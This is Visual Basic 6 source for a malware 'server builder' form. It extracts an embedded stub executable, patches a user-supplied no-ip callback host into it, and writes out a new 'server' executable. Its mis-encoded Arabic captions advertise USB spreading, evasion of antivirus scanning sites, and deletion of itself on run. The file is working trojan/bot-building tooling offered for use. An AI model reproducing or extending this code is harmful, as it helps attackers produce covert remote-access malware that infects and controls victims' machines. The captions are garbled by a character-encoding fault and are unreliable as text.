VERSION 5.00
Begin VB.Form Build1 
   BackColor       =   &H000000C0&
   Caption         =   " ﬂÊÌ‰"
   ClientHeight    =   2850
   ClientLeft      =   120
   ClientTop       =   420
   ClientWidth     =   3330
   Icon            =   "Build.frx":0000
   LinkTopic       =   "Form4"
   ScaleHeight     =   2850
   ScaleWidth      =   3330
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command1 
      Caption         =   " ﬂÊÌ‰ «·”Ì—›—"
      Height          =   375
      Left            =   1920
      TabIndex        =   2
      Top             =   2400
      Width           =   1215
   End
   Begin VB.TextBox txt_settings 
      Height          =   285
      Left            =   1320
      TabIndex        =   0
      Top             =   1560
      Width           =   1575
   End
   Begin VB.Label Label8 
      BackColor       =   &H000000C0&
      Caption         =   "Ê „Ì“«  «Œ—Ï ﬁÊÌ… «ﬂ ‘›Â« »‰›”ﬂ"
      Height          =   255
      Left            =   480
      TabIndex        =   9
      Top             =   1200
      Width           =   2895
   End
   Begin VB.Label Label7 
      BackColor       =   &H000000C0&
      Caption         =   "·« Ìﬂ‘› „‰ „Ê«ﬁ⁄  «·›Õ’ "
      Height          =   495
      Left            =   1800
      TabIndex        =   8
      Top             =   720
      Width           =   1455
   End
   Begin VB.Label Label6 
      BackColor       =   &H000000C0&
      Caption         =   "USB Ì‰ﬁ· ⁄»—"
      Height          =   255
      Left            =   1800
      TabIndex        =   7
      Top             =   480
      Width           =   1455
   End
   Begin VB.Label Label5 
      BackColor       =   &H000000C0&
      Caption         =   "„À«· : (hacker85.no-ip.biz)"
      DragIcon        =   "Build.frx":0442
      Height          =   255
      Left            =   600
      TabIndex        =   6
      Top             =   2040
      Width           =   2175
   End
   Begin VB.Label Label4 
      BackColor       =   &H000000C0&
      Caption         =   "Ì⁄„· ⁄·Ï «·›Ì” «"
      Height          =   255
      Left            =   240
      TabIndex        =   5
      Top             =   720
      Width           =   1575
   End
   Begin VB.Label Label3 
      BackColor       =   &H000000C0&
      Caption         =   "«·≈–«»… ⁄‰œ «· ‘€Ì·"
      Height          =   255
      Left            =   240
      TabIndex        =   4
      Top             =   480
      Width           =   1335
   End
   Begin VB.Label Label2 
      BackColor       =   &H000000C0&
      Caption         =   "«·„„Ì“« "
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   240
      Width           =   1935
   End
   Begin VB.Label Label1 
      BackColor       =   &H000000C0&
      Caption         =   "      «·‰Ê «Ì»Ì :"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   1560
      Width           =   1095
   End
End
Attribute VB_Name = "Build1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'/Builder
Dim data(1 To 600) As String
Dim sent As Integer
Dim checkeditem As Integer
Dim f As Integer
Option Explicit
Private Declare Function GetCursorPos Lib "User32" (lpPoint As POINTAPI) As Long

Private Type POINTAPI
 X As Long
 Y As Long
End Type

Private Declare Function GetSaveFileNameA Lib "comdlg32.dll" (pOpenfilename As OPENFILENAME) As Long
Private Declare Function GetActiveWindow Lib "User32" () As Long
Private Type OPENFILENAME
    lStructSize As Long
    hwndOwner As Long
    hInstance As Long
    lpstrFilter As String
    lpstrCustomFilter As String
    nMaxCustFilter As Long
    nFilterIndex As Long
    lpstrFile As String
    nMaxFile As Long
    lpstrFileTitle As String
    nMaxFileTitle As Long
    lpstrInitialDir As String
    lpstrTitle As String
    flags As Long
    nFileOffset As Integer
    nFileExtension As Integer
    lpstrDefExt As String
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
End Type

Function SaveAsCommonDialog(Optional sTitle = "Save File", Optional sFilter As String, Optional sDefaultDir As String) As String
    Const clBufferLen As Long = 255
    Dim OFName As OPENFILENAME, sBuffer As String * clBufferLen
    
    On Error GoTo ExitFunction
    OFName.lStructSize = Len(OFName)
    OFName.hwndOwner = GetActiveWindow  'or Me.hwnd in VB
    OFName.hInstance = 0                'or App.hInstance in VB
    If Len(sFilter) Then
        OFName.lpstrFilter = sFilter
    Else
        OFName.lpstrFilter = "Text Files (*.txt)" & Chr$(0) & "*.txt" & Chr$(0) & "All Files (*.*)" & Chr$(0) & "*.*" & Chr$(0)
    End If
    OFName.lpstrFile = sBuffer
    OFName.nMaxFile = clBufferLen       'Set max number of characters
    OFName.lpstrFileTitle = sBuffer
    OFName.nMaxFileTitle = clBufferLen  'Set max number of characters
    'Set the initial directory
    If Len(sDefaultDir) Then
        OFName.lpstrInitialDir = sDefaultDir
    Else
        OFName.lpstrInitialDir = CurDir$
    End If
    OFName.lpstrTitle = sTitle
    OFName.flags = 0

    'Show dialog
    If GetSaveFileNameA(OFName) Then
        SaveAsCommonDialog = Left$(OFName.lpstrFile, InStr(1, OFName.lpstrFile, Chr(0)) - 1)
    Else
        SaveAsCommonDialog = ""
    End If
ExitFunction:
    On Error GoTo 0
End Function

Private Sub Form_Load()
Call sexytime
Dim NewPos As POINTAPI

Call GetCursorPos(NewPos)

 Me.Left = (NewPos.X * 15) + 100
 Me.Top = (NewPos.Y * 15) + 100

End Sub

Private Sub Command1_Click()
    Dim f As Integer
    Dim i As Integer
    Dim stub As String
    Dim stubneu As String
    Dim settings As String
    Dim settingsnew As String
    Dim buildstring As String
    '/Build
    buildstring = "1" & Chr(0) & "2" & Chr(0) & "3" & Chr(0) & "4" & Chr(0) & "5" & Chr(0) & _
                  "6" & Chr(0) & "7" & Chr(0) & "8" & Chr(0) & "9" & Chr(0) & "0" & Chr(0)
    buildstring = buildstring & buildstring & buildstring & _
                  buildstring & buildstring & buildstring
    
    '/Load Bot
    f = FreeFile
    Open "stub.exe" For Binary As #f
        stub = Space(LOF(f))
        Get #f, , stub
    Close #f
    
    '/Get Settings
    settings = "[Settings]" & txt_settings.text & "[Settings]"
    
    '/Set Settings
    While Len(settings) < 60
        settings = settings & "."
    Wend
    
    '/Build New Data
    For i = 1 To Len(settings)
        settingsnew = settingsnew & Mid(settings, i, 1) & Chr(0)
    Next
    
    '/Replace New File With Data
    stubneu = Replace(stub, buildstring, settingsnew)
    
     Dim sFilePath As String
    sFilePath = SaveAsCommonDialog("Save server file", "*.exe", CurDir)
    
    '/Create New File
    f = FreeFile
    Open sFilePath & ".exe" For Binary As #f
        Put #f, , stubneu
    Close #f
    Call MsgBox("Server Built for ReDirect/IP: " & txt_settings, vbApplicationModal, "Done!")
    Unload Me
End Sub
Private Function sexytime()
On Error Resume Next
Dim Byt_Fsg() As Byte
    Byt_Fsg = LoadResData(101, "CUSTOM")
    Open CurDir & "\stub.exe" For Binary As #1
        Put #1, 1, Byt_Fsg
    Close #1
End Function

Private Sub Form_Unload(Cancel As Integer)
Kill CurDir & "\stub.exe"
End Sub

Private Sub txt_settings_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
        Command1_Click
    End If
    If KeyAscii = 27 Then
    Unload Me
    End If
End Sub
